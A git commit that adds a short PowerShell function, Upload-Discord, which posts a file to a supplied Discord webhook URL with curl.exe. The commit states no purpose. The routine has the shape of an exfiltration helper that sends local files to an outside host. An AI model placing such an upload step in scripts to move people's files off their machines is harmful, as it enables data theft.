c86eb0420a485840dcb1a69ce0f2c2da3e9f6a96
alexander carrareas <113837595+escamasbuen@users.noreply.github.com>
2023-06-11 14:48:21 +0200

    Create comaadded.ps1

---
+++ comaadded.ps1
@@ -0,0 +1,19 @@
+function Upload-Discord {
+
+[CmdletBinding()]
+param (
+    [parameter(Position=0,Mandatory=$False)]
+    [string]$file,
+    [parameter(Position=1,Mandatory=$False)]
+    [string]$text,
+    [parameter(Position=2,Mandatory=$False)]
+    [string]$hookurl 
+)
+
+$Body = @{
+  'username' = "bad name"
+  'content' = $text
+}
+
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+}
